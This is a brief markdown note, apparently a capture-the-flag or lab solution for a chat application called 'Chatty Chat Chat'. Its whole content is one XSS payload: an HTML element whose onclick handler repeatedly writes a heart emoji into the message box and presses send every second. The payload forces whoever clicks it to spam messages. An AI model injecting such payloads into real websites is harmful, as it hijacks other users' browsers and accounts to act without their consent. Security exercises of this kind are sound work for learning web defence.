# Chatty Chat Chat

## XSS

```html
<b onclick="function t() {document.getElementById('new-message-input').value = '❤️'; document.getElementById('send').click(); setTimeout(t, 1000);} t();">❤️</b>
```
